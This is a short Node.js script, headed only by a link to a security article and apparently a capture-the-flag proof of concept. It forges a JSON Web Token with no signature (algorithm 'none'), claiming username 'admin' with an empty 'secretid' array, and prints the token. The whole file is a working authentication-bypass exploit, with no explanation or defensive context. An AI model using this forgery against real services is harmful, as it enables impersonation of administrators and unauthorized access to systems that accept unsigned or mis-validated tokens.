// https://www.secpulse.com/archives/129304.html

const jwt = require('jsonwebtoken');

var payload = {
    secretid: [],
    username: 'admin',
}
var token = jwt.sign(payload, undefined, {algorithm: 'none'});
console.log(token);